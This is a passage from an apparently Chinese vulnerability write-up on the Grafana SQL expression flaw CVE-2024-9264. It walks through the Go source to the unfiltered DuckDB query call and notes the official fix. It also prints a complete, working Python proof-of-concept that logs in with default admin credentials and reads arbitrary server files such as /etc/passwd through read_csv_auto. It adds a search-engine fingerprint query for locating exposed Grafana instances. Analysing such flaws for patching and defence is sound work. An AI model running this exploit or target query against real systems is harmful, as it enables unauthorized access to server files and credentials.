title="错误处理："></a><strong>错误处理</strong>：</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> fmt<span class="token punctuation">.</span><span class="token function">Errorf</span><span class="token punctuation">(</span><span class="token string">"expression request error: %w"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果在调用 <code>TransformData</code> 时发生错误，返回一个格式化的错误信息。</p><h3 id="返回结果："><a href="#返回结果：" class="headerlink" title="返回结果："></a><strong>返回结果</strong>：</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">return</span> qdr<span class="token punctuation">,</span> <span class="token boolean">nil</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果一切正常，返回查询数据响应 <code>qdr</code> 和 <code>nil</code>（表示没有错误）。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这个方法的主要功能是处理表达式查询请求，验证用户信息，构建查询请求，调用服务处理查询，并返回结果或错误。它展示了Go语言中如何处理HTTP请求、上下文管理、错误处理和数据结构的使用。</p></blockquote><p>所以核心代码调用了表达式服务。</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">s<span class="token punctuation">.</span>expressionService<span class="token punctuation">.</span><span class="token function">TransformData</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> time<span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>exprReq<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-2-3-Execute函数"><a href="#3-2-3-Execute函数" class="headerlink" title="3.2.3 Execute函数"></a>3.2.3 Execute函数</h3><p>最终执行sql语句的函数在sql_command.go中</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// Execute runs the command and returns the results or an error if the command</span><span class="token comment">// failed to execute.</span><span class="token keyword">func</span> <span class="token punctuation">(</span>gr <span class="token operator">*</span>SQLCommand<span class="token punctuation">)</span> <span class="token function">Execute</span><span class="token punctuation">(</span>ctx context<span class="token punctuation">.</span>Context<span class="token punctuation">,</span> now time<span class="token punctuation">.</span>Time<span class="token punctuation">,</span> vars mathexp<span class="token punctuation">.</span>Vars<span class="token punctuation">,</span> tracer tracing<span class="token punctuation">.</span>Tracer<span class="token punctuation">)</span> <span class="token punctuation">(</span>mathexp<span class="token punctuation">.</span>Results<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token boolean">_</span><span class="token punctuation">,</span> span <span class="token operator">:=</span> tracer<span class="token punctuation">.</span><span class="token function">Start</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> <span class="token string">"SSE.ExecuteSQL"</span><span class="token punctuation">)</span><span class="token keyword">defer</span> span<span class="token punctuation">.</span><span class="token function">End</span><span class="token punctuation">(</span><span class="token punctuation">)</span>allFrames <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">*</span>data<span class="token punctuation">.</span>Frame<span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> ref <span class="token operator">:=</span> <span class="token keyword">range</span> gr<span class="token punctuation">.</span>varsToQuery <span class="token punctuation">{</span>results<span class="token punctuation">,</span> ok <span class="token operator">:=</span> vars<span class="token punctuation">[</span>ref<span class="token punctuation">]</span><span class="token keyword">if</span> <span class="token operator">!</span>ok <span class="token punctuation">{</span>logger<span class="token punctuation">.</span><span class="token function">Warn</span><span class="token punctuation">(</span><span class="token string">"no results found for"</span><span class="token punctuation">,</span> <span class="token string">"ref"</span><span class="token punctuation">,</span> ref<span class="token punctuation">)</span><span class="token keyword">continue</span><span class="token punctuation">}</span>frames <span class="token operator">:=</span> results<span class="token punctuation">.</span>Values<span class="token punctuation">.</span><span class="token function">AsDataFrames</span><span class="token punctuation">(</span>ref<span class="token punctuation">)</span>allFrames <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>allFrames<span class="token punctuation">,</span> frames<span class="token operator">...</span><span class="token punctuation">)</span><span class="token punctuation">}</span>rsp <span class="token operator">:=</span> mathexp<span class="token punctuation">.</span>Results<span class="token punctuation">{</span><span class="token punctuation">}</span>duckDB <span class="token operator">:=</span> duck<span class="token punctuation">.</span><span class="token function">NewInMemoryDB</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">var</span> frame <span class="token operator">=</span> <span class="token operator">&amp;</span>data<span class="token punctuation">.</span>Frame<span class="token punctuation">{</span><span class="token punctuation">}</span>logger<span class="token punctuation">.</span><span class="token function">Debug</span><span class="token punctuation">(</span><span class="token string">"Executing query"</span><span class="token punctuation">,</span> <span class="token string">"query"</span><span class="token punctuation">,</span> gr<span class="token punctuation">.</span>query<span class="token punctuation">,</span> <span class="token string">"frames"</span><span class="token punctuation">,</span> <span class="token function">len</span><span class="token punctuation">(</span>allFrames<span class="token punctuation">)</span><span class="token punctuation">)</span>err <span class="token operator">:=</span> duckDB<span class="token punctuation">.</span><span class="token function">QueryFramesInto</span><span class="token punctuation">(</span>gr<span class="token punctuation">.</span>refID<span class="token punctuation">,</span> gr<span class="token punctuation">.</span>query<span class="token punctuation">,</span> allFrames<span class="token punctuation">,</span> frame<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>logger<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token string">"Failed to query frames"</span><span class="token punctuation">,</span> <span class="token string">"error"</span><span class="token punctuation">,</span> err<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>rsp<span class="token punctuation">.</span>Error <span class="token operator">=</span> err<span class="token keyword">return</span> rsp<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">}</span>logger<span class="token punctuation">.</span><span class="token function">Debug</span><span class="token punctuation">(</span><span class="token string">"Done Executing query"</span><span class="token punctuation">,</span> <span class="token string">"query"</span><span class="token punctuation">,</span> gr<span class="token punctuation">.</span>query<span class="token punctuation">,</span> <span class="token string">"rows"</span><span class="token punctuation">,</span> frame<span class="token punctuation">.</span><span class="token function">Rows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>frame<span class="token punctuation">.</span>RefID <span class="token operator">=</span> gr<span class="token punctuation">.</span>refID<span class="token keyword">if</span> frame<span class="token punctuation">.</span><span class="token function">Rows</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">{</span>rsp<span class="token punctuation">.</span>Values <span class="token operator">=</span> mathexp<span class="token punctuation">.</span>Values<span class="token punctuation">{</span>mathexp<span class="token punctuation">.</span>NoData<span class="token punctuation">{</span>Frame<span class="token punctuation">:</span> frame<span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">}</span>rsp<span class="token punctuation">.</span>Values <span class="token operator">=</span> mathexp<span class="token punctuation">.</span>Values<span class="token punctuation">{</span>mathexp<span class="token punctuation">.</span>TableData<span class="token punctuation">{</span>Frame<span class="token punctuation">:</span> frame<span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token keyword">return</span> rsp<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><h3 id="方法签名-1"><a href="#方法签名-1" class="headerlink" title="方法签名"></a>方法签名</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>gr <span class="token operator">*</span>SQLCommand<span class="token punctuation">)</span> <span class="token function">Execute</span><span class="token punctuation">(</span>ctx context<span class="token punctuation">.</span>Context<span class="token punctuation">,</span> now time<span class="token punctuation">.</span>Time<span class="token punctuation">,</span> vars mathexp<span class="token punctuation">.</span>Vars<span class="token punctuation">,</span> tracer tracing<span class="token punctuation">.</span>Tracer<span class="token punctuation">)</span> <span class="token punctuation">(</span>mathexp<span class="token punctuation">.</span>Results<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><strong>接收者</strong>：<code>gr *SQLCommand</code> 表示这个方法是 <code>SQLCommand</code> 结构体的指针方法。</li><li>参数：<ul><li><code>ctx context.Context</code>：用于传递上下文信息，通常用于控制请求的生命周期和处理超时。</li><li><code>now time.Time</code>：表示当前时间，可能用于时间相关的查询。</li><li><code>vars mathexp.Vars</code>：一个变量映射，可能包含查询中需要的变量值。</li><li><code>tracer tracing.Tracer</code>：用于跟踪和记录查询执行的过程。</li></ul></li><li><strong>返回值</strong>：返回一个 <code>mathexp.Results</code> 类型的结果和一个 <code>error</code> 类型的错误。</li></ul><h3 id="执行SQL查询："><a href="#执行SQL查询：" class="headerlink" title="执行SQL查询："></a><strong>执行SQL查询</strong>：</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go">duckDB <span class="token operator">:=</span> duck<span class="token punctuation">.</span><span class="token function">NewInMemoryDB</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">var</span> frame <span class="token operator">=</span> <span class="token operator">&amp;</span>data<span class="token punctuation">.</span>Frame<span class="token punctuation">{</span><span class="token punctuation">}</span>logger<span class="token punctuation">.</span><span class="token function">Debug</span><span class="token punctuation">(</span><span class="token string">"Executing query"</span><span class="token punctuation">,</span> <span class="token string">"query"</span><span class="token punctuation">,</span> gr<span class="token punctuation">.</span>query<span class="token punctuation">,</span> <span class="token string">"frames"</span><span class="token punctuation">,</span> <span class="token function">len</span><span class="token punctuation">(</span>allFrames<span class="token punctuation">)</span><span class="token punctuation">)</span>err <span class="token operator">:=</span> duckDB<span class="token punctuation">.</span><span class="token function">QueryFramesInto</span><span class="token punctuation">(</span>gr<span class="token punctuation">.</span>refID<span class="token punctuation">,</span> gr<span class="token punctuation">.</span>query<span class="token punctuation">,</span> allFrames<span class="token punctuation">,</span> frame<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>创建一个DuckDB的内存数据库实例，准备一个数据帧 <code>frame</code> 来存储查询结果，并记录调试信息。然后执行SQL查询，将结果存储到 <code>frame</code> 中。</p><h3 id="构建结果："><a href="#构建结果：" class="headerlink" title="构建结果："></a><strong>构建结果</strong>：</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">if</span> frame<span class="token punctuation">.</span><span class="token function">Rows</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">{</span>    rsp<span class="token punctuation">.</span>Values <span class="token operator">=</span> mathexp<span class="token punctuation">.</span>Values<span class="token punctuation">{</span>        mathexp<span class="token punctuation">.</span>NoData<span class="token punctuation">{</span>Frame<span class="token punctuation">:</span> frame<span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>rsp<span class="token punctuation">.</span>Values <span class="token operator">=</span> mathexp<span class="token punctuation">.</span>Values<span class="token punctuation">{</span>    mathexp<span class="token punctuation">.</span>TableData<span class="token punctuation">{</span>Frame<span class="token punctuation">:</span> frame<span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果查询结果为空，设置结果的值为 <code>mathexp.NoData</code>；否则，设置结果的值为 <code>mathexp.TableData</code>，包含查询结果的数据帧。</p></blockquote><p>核心代码：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">err <span class="token operator">:=</span> duckDB<span class="token punctuation">.</span><span class="token function">QueryFramesInto</span><span class="token punctuation">(</span>gr<span class="token punctuation">.</span>refID<span class="token punctuation">,</span> gr<span class="token punctuation">.</span>query<span class="token punctuation">,</span> allFrames<span class="token punctuation">,</span> frame<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><code>QueryFramesInto</code> 方法是 DuckDB Go 绑定提供的一个方法，它允许你执行 SQL 查询并将结果直接插入到一个 <code>data.Frame</code> 中。这个方法结合了 SQL 查询的灵活性和 DataFrame 操作的便捷性，使得数据处理流程更加高效。</p><p>以下是 <code>QueryFramesInto</code> 方法的一般使用方式：</p><h3 id="函数签名"><a href="#函数签名" class="headerlink" title="函数签名"></a>函数签名</h3><p>go</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>db <span class="token operator">*</span>DB<span class="token punctuation">)</span> <span class="token function">QueryFramesInto</span><span class="token punctuation">(</span>refID <span class="token builtin">string</span><span class="token punctuation">,</span> query <span class="token builtin">string</span><span class="token punctuation">,</span> inputFrames <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">*</span>data<span class="token punctuation">.</span>Frame<span class="token punctuation">,</span> resultFrame <span class="token operator">*</span>data<span class="token punctuation">.</span>Frame<span class="token punctuation">)</span> <span class="token builtin">error</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>db *DB</code>: DuckDB 数据库的实例指针。</li><li><code>refID string</code>: 查询的引用ID，通常用于日志记录和调试。</li><li><code>query string</code>: 要执行的 SQL 查询字符串。</li><li><code>inputFrames []*data.Frame</code>: 一个 <code>data.Frame</code> 切片，包含作为查询输入的数据。</li><li><code>resultFrame *data.Frame</code>: 一个指向 <code>data.Frame</code> 的指针，用于存储查询结果。</li></ul></blockquote><p>由于没有对SQL查询字符串做过滤限制，导致恶意的SQL语句直接传递到DuckDB执行。</p><h1 id="四、完整的POC"><a href="#四、完整的POC" class="headerlink" title="四、完整的POC"></a>四、完整的POC</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> json<span class="token keyword">import</span> sys<span class="token keyword">import</span> argparse<span class="token keyword">class</span> <span class="token class-name">Console</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">log</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>console <span class="token operator">=</span> Console<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">msg_success</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">:</span>    console<span class="token punctuation">.</span>log<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[SUCCESS] </span><span class="token interpolation"><span class="token punctuation">{</span>msg<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">msg_failure</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">:</span>    console<span class="token punctuation">.</span>log<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[FAILURE] </span><span class="token interpolation"><span class="token punctuation">{</span>msg<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">failure</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">:</span>    msg_failure<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">authenticate</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> url<span class="token punctuation">,</span> u<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>url<span class="token punctuation">}</span></span><span class="token string">/login"</span></span><span class="token punctuation">,</span> json<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"password"</span><span class="token punctuation">:</span> p<span class="token punctuation">,</span> <span class="token string">"user"</span><span class="token punctuation">:</span> u<span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"message"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"Logged in"</span><span class="token punctuation">:</span>        msg_success<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Logged in as </span><span class="token interpolation"><span class="token punctuation">{</span>u<span class="token punctuation">}</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">{</span>p<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        failure<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Failed to log in as </span><span class="token interpolation"><span class="token punctuation">{</span>u<span class="token punctuation">}</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">{</span>p<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">run_query</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> url<span class="token punctuation">,</span> query<span class="token punctuation">)</span><span class="token punctuation">:</span>    query_url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>url<span class="token punctuation">}</span></span><span class="token string">/api/ds/query?ds_type=__expr__&amp;expression=true&amp;requestId=1"</span></span>    query_payload <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"from"</span><span class="token punctuation">:</span> <span class="token string">"1696154400000"</span><span class="token punctuation">,</span>        <span class="token string">"to"</span><span class="token punctuation">:</span> <span class="token string">"1696345200000"</span><span class="token punctuation">,</span>        <span class="token string">"queries"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>            <span class="token punctuation">{</span>                <span class="token string">"datasource"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>                    <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"Expression"</span><span class="token punctuation">,</span>                    <span class="token string">"type"</span><span class="token punctuation">:</span> <span class="token string">"__expr__"</span><span class="token punctuation">,</span>                    <span class="token string">"uid"</span><span class="token punctuation">:</span> <span class="token string">"__expr__"</span>                <span class="token punctuation">}</span><span class="token punctuation">,</span>                <span class="token string">"expression"</span><span class="token punctuation">:</span> query<span class="token punctuation">,</span>                <span class="token string">"hide"</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span>                <span class="token string">"refId"</span><span class="token punctuation">:</span> <span class="token string">"B"</span><span class="token punctuation">,</span>                <span class="token string">"type"</span><span class="token punctuation">:</span> <span class="token string">"sql"</span><span class="token punctuation">,</span>                <span class="token string">"window"</span><span class="token punctuation">:</span> <span class="token string">""</span>            <span class="token punctuation">}</span>        <span class="token punctuation">]</span>    <span class="token punctuation">}</span>    res <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>query_url<span class="token punctuation">,</span> json<span class="token operator">=</span>query_payload<span class="token punctuation">)</span>    data <span class="token operator">=</span> res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># Handle unexpected response</span>    <span class="token keyword">if</span> <span class="token string">"message"</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>        msg_failure<span class="token punctuation">(</span><span class="token string">"Unexpected response:"</span><span class="token punctuation">)</span>        msg_failure<span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">,</span> indent<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">None</span>    <span class="token comment"># Extract results</span>    frames <span class="token operator">=</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"results"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"B"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"frames"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> frames<span class="token punctuation">:</span>        values <span class="token operator">=</span> <span class="token punctuation">[</span>            row            <span class="token keyword">for</span> frame <span class="token keyword">in</span> frames            <span class="token keyword">for</span> row <span class="token keyword">in</span> frame<span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"values"</span><span class="token punctuation">]</span>        <span class="token punctuation">]</span>                <span class="token keyword">if</span> values<span class="token punctuation">:</span>            msg_success<span class="token punctuation">(</span><span class="token string">"Successfully ran DuckDB query:"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> values    failure<span class="token punctuation">(</span><span class="token string">"No valid results found."</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">decode_output</span><span class="token punctuation">(</span>values<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token string">":"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> row <span class="token keyword">if</span> i <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">)</span> <span class="token keyword">for</span> row <span class="token keyword">in</span> values<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token string">"admin"</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>    authenticate<span class="token punctuation">(</span>s<span class="token punctuation">,</span> url<span class="token punctuation">,</span> user<span class="token punctuation">,</span> password<span class="token punctuation">)</span>    <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">file</span> <span class="token keyword">or</span> <span class="token string">"/etc/passwd"</span>    escaped_filename <span class="token operator">=</span> requests<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>quote<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span>    query <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"SELECT * FROM read_csv_auto('</span><span class="token interpolation"><span class="token punctuation">{</span>escaped_filename<span class="token punctuation">}</span></span><span class="token string">');"</span></span>    content <span class="token operator">=</span> run_query<span class="token punctuation">(</span>s<span class="token punctuation">,</span> url<span class="token punctuation">,</span> query<span class="token punctuation">)</span>    <span class="token keyword">if</span> content<span class="token punctuation">:</span>        msg_success<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Retrieved file </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">file</span><span class="token punctuation">}</span></span><span class="token string">:"</span></span><span class="token punctuation">)</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> decode_output<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">"Arbitrary File Read in Grafana via SQL Expression (CVE-2024-9264)."</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--url"</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"URL of the Grafana instance to exploit"</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--user"</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"Username to log in as, defaults to 'admin'"</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--password"</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"Password used to log in, defaults to 'admin'"</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--file"</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"File to read on the server, defaults to '/etc/passwd'"</span><span class="token punctuation">)</span>    args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>    main<span class="token punctuation">(</span>args<span class="token punctuation">.</span>url<span class="token punctuation">,</span> args<span class="token punctuation">.</span>user<span class="token punctuation">,</span> args<span class="token punctuation">.</span>password<span class="token punctuation">,</span> args<span class="token punctuation">.</span><span class="token builtin">file</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="五、漏洞测绘"><a href="#五、漏洞测绘" class="headerlink" title="五、漏洞测绘"></a>五、漏洞测绘</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">app</span><span class="token operator">=</span><span class="token string">"Grafana_Labs-公司产品"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="六、漏洞修复"><a href="#六、漏洞修复" class="headerlink" title="六、漏洞修复"></a>六、漏洞修复</h1><h2 id="6-1-官方漏洞修复"><a href="#6-1-官方漏洞修复" class="headerlink" title="6.1 官方漏洞修复"></a>6.1 官方漏洞修复</h2><p>11.4.0（latest）的源代码中对duckDB的功能直接进行了删除。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">db :<span class="token operator">=</span> <span class="token keyword">sql</span><span class="token punctuation">.</span>NewInMemoryDB<span class="token punctuation">(</span><span class="token punctuation">)</span>var frame <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">data</span><span class="token punctuation">.</span>Frame{}logger<span class="token punctuation">.</span>Debug<span class="token punctuation">(</span><span class="token string">"Executing query"</span><span class="token punctuation">,</span> <span class="token string">"query"</span><span class="token punctuation">,</span> gr<span class="token punctuation">.</span>query<span class="token punctuation">,</span> <span class="token string">"frames"</span><span class="token punctuation">,</span> <span class="token function">len</span><span class="token punctuation">(</span>allFrames<span class="token punctuation">)</span><span class="token punctuation">)</span>err :<span class="token operator">=</span> db<span class="token punctuation">.</span>QueryFramesInto<span class="token punctuation">(</span>gr<span class="token punctuation">.</span>refID<span class="token punctuation">,</span> gr<span class="token punctuation">.</span>query<span class="token punctuation">,</span> allFrames<span class="token punctuation">,</span> frame<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-23%2016.54.21.png" alt="11.4.0" style="zoom:50%;"><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-23%2016.55.04.png" alt="11.1.0" 